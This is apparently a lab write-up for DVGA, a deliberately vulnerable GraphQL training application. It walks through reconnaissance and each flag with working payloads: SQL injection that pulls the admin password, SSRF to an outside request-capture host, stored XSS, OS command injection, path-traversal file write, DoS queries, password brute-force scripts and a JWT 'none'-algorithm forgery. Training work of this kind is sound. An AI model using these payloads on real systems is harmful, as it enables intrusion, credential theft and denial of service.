#DVGA

**It's a vulnerable graphql application mean't to train users in graphql hacking.**

##Reconessaince

###Discovering graphql endpoint

I started by using the application like a normal user, figuring out what it did but with BurpSuite open. After a few requests, I noticed it sent the information to an endpoint `graphql`. After sending a `GET` request, I noticed it expected a `query` parameter. This is it!

###GraphQL Type

I used a fingerprinting tool which automatically does a number of things to detect that. It is `graphw00f`. After executing, it told me it was graphene.

###Googling

I googled for graphene's characteristics and it had a lot of security misconfigurations by default.

```
1. Field Suggestions: Enabled by Default

2. Query Depth LImit: No Support

3. Query Cost Analysis: No Support

4. Introspection: Enabled by Default.

```
This basically means: 

1. If we write a query with a field that doesn't exist but is keen to another one, it will suggest  that. (That allows us to bruteforce the schema). In my opinion this falls into `Security Misconfiguration` of the TOP 10 API.

2. There is no depth limit, which means we can make the query be as big as we want. In my opinion this falls into `Lack of Resources and Rate-Limiting`

3. The server doesn't care about the cost the query has, that means it will execute it even if it will DoS the server. In my opinion, this falls into `Lack of Resources and Rate-Limiting`

4. The server can "look at itself" and figure its schema via client request. In my opinion, this falls into - `informative`

###Instrospection

```
fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}

```



##Flags

**SQLi**  

SQL Injection happens when user input is directly joined with an SQL statement without proper validation. One simply needs to ascertain the context in which injection occurs and validate the resulting SQL statement.

In this case, the web application, with the below payload, returns errors from which we can deduce user input is directly inputted in the SQL statement.

`query={pastes(filter:"1'"){content}}`

SInce this is an error based SQLi we have output, and that means we can directly exfiltrate the information by constructing an appropriate query.

Steal admin username: `{pastes(filter:"a'%20UNION%20SELECT%201%2c%202%2c%20password%2c%204%2c%205%2c%206%2c%207%2c%208%20FROM%20users%20+WHERE+username+=+'admin'+--"){content}}`

This queries uses the UNION directive, which takes the results from two statements and places them on one virtual table. In this case, the first table, the one of the left, does not have an output, and the second query only has one. In order to find out which field is being reflected in the response, we can simply do `SELECT 1, 2, 3, 4, 5, 6, 7, 8` and see which number is reflected, then we need only to replace, in the constructed statement, the number, for the field we want to SELECT. In this case, we care about the password field, so all we need to do is replace it with corresponding number. 

**SSRF** 

Server-Side Request Forgery - As the a name implies, a request is made server-side. In this case, it's not blind, as the html of the site requested is fully reflected onto the page. SSRF can be damaging. As it is server side, one can replace a simple `http://` request, with, for example, `file://`, then the server will interpret it as a directive to look into its own file system, and will then reflect the file you give it from there.

```

{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }","variables":{"host":"eowhrtbaia65ev1.m.pipedream.net","port":443,"path":"/","scheme":"https"}}

```

**Stored XSS & HTML Injection** 

Stored XSS, or persistent XSS, means user input is reflected onto the html without proper validation and is stored in a databse, which means everytime you open the page, the payload will execute. Whether it be JS code or HTML code.

`{"query":"mutation{createPaste(title:\"swag'<script>alert(1);</script>\",content:\"swag2'<script>alert(1);</script>\"){paste{title,content}}}"}`

**OS Command Injection** 

OS Command Injection - This implies the direct use of input to the shell or simply a `system` function with input made by the user. That sink, or direct communcation with the shell, allows us to inject arbitrary commands on any host for as long as the host has those commands available.

`query={systemDebug(arg:+";+sleep+10;")}`

```
{"query":"mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!) {\n        importPaste(host: $host, port: $port, path: $path, scheme: $scheme) {\n          result\n        }\n      }","variables":{"host":"localhost","port":80,"path":"/; uname -a;","scheme":"http"}} 
							
```

**Discovering GraphQL** -

Discovering graphql is as simple as trying out a few of the common endpoints, as that is usually where it is installed.

 `GET /graphql`

**Resource Intensive Query Attack** - `{pastes(limit:100000){title,public,owner{paste{title,public,owner{paste{title,public,owner{paste{title,public}}}}}}}}}`

This happens because of circular logic. One object leads to another and that same object leads to the first one. This can be used to skip authorization checks or DoS. If we construct a query with the needed ammount of depth, we can DoS. If we use the circular logic to access like this: `query={users(username:"yourusername"){posts(made_by:"notyourusername"){users{username}}}`, we can bypass authorization checks.

**Batch Query Attack** -
 `mutation{login(username:"admin",password:"admin"){accessToken,refreshToken}second:login(username:+"admin",password:"123456"){accessToken,refreshToken}}` or
`python CrackQL.py -t http://localhost:5013/graphql -q sample-queries/login.graphql -i sample-inputs/usernames_and_passwords.csv`

Batch queries - Means we can use a first query, then a second query, which means, multiple queries at the same time, can facilitate bruteforce.

**Aliases based Attack** -

Aliases are means to call the same object in two different ways so that they don't conflict. For example:

```
{
  empireHero: hero(episode: EMPIRE) {
    name
  }
  jediHero: hero(episode: JEDI) {
    name
  }
}
```
WIth result:

```
{
  "data": {
    "empireHero": {
      "name": "Luke Skywalker"
    },
    "jediHero": {
      "name": "R2-D2"
    }
  }
}

```

```
query=query{q1:systemUpdate+q2:systemUpdate+q3:systemUpdate}

```
Means we can create aliases for Objects and as such can do multiple queries of the same type at the same time, If enough queries are made, this can lead to DoS.

**GraphQL Query Deny List Bypass** 

This can be done, if the check is done via operation name, by finding a way to rename the operation. Either via operation name or aliases, for example. This happens because the backend looks for a name which does not exist, as it was renamed by changing the operation name to an arbitrary value or creating an alias for that operation.

```
{
"query":"{q1:systemHealth}"
}

```
or

```
{
"query":"query getPastes{systemHealth}"
}

```

**Arbitrary File Write & Path Traversal**

This happens because there is a sink in the source code which opens a file, allows traversal and then writes to it.

In this case particularly, I can bet its the `open` function of Python with the `w` flag. It takes direct user input onto it and as such we can traverse and write arbitrarily

```
mutation {
  uploadPaste(filename:"../../../../../tmp/file.txt", content:"hi"){
    result
  }
}

```

**GraphQL weak password protection** 

Basically, there is no rate limit checking in place, and as such an attacker can send as many requests as he wants. This means he will be able to crack a password.

Here is an example script:

```
# Brute Force attack with a list of passwords:
passwordlist = ['admin123', 'pass123', 'adminadmin', '123']

for password in passwordlist:
  resp = requests.post('http://host/graphql',
  json = {
    "query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),
    "variables":None
  })

  if not 'errors' in resp.text:
    print('Password is', password
  
```
or you can use CrackQL:

``` 
query{systemDiagnostics(username: "admin", password: {{password|str}}, cmd: "sleep 10") {}}

```
Place this in a arbitrary named file with extension graphql: `mypayload.graphql`
Pass it to CrackQL like:

```
python CrackQL.py -t http://localhost:5013/graphql -q mypayload.graphql -i sample-inputs/passwords.csv```

```

**GraphQL Interface**

There's an interface that allows to query GraphQL in a friendly way. 
Simply browse to `http://localhost:5013/graphiql`. If needed, set the `graphiql:disabled` cookie by switching disabled with enabled <=> `graphiql:enabled`


**JWT Token Forge**

This works because we can change the signing key to `none` and the server accepts that. Basically, the logic goes like this:
We change the algorithm to none => send it to the server => recognizes that type => lets it pass without verifiying the signature because it accepts jwt's without one.

To reproduce this, login as operator:

```
{"query":"mutation{login(username:\"operator\",password:\"password123\"){accessToken}}"}

```
Copy the accessToken (save it somewhere if you want).

Go to `token.dev`

Paste the token

Change the algorithm to `none`

Change user to `admin`

Send a request like this but replace the token with yours (don't forget to include a `.` at the end of the token).

```
{"query":"{me(token:\"<your_token_here>\"){id,username,password}}"}

```
Send the request, notice you are admin and you have the password.

**Field Duplication Attack**

This happens because there's no restraint to how many fields can be inside a query. This can stress the server, leading to a DoS

```
query {
  pastes {
    owner {
      pastes {
            ipAddr # 1
            ipAddr # 2
            ipAddr # 3
            ipAddr # 4
            ipAddr # 1000
          }
        }
      }
      
```




